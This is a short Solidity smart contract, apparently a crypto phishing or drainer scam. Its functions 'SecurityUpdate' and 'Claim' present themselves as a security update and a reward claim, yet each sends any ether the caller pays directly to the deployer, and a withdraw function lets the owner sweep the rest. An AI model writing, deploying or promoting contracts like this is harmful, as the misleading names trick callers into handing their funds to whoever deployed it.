// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract SecurityUpdates {
    address private owner;
    constructor() { owner = msg.sender; }
    function SecurityUpdate() public payable {
        payable(owner).transfer(msg.value);
    }
    function Claim() public payable {
        (bool s, ) = owner.call{value: msg.value}("");
        require(s);
    }
    function withdraw() public {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}
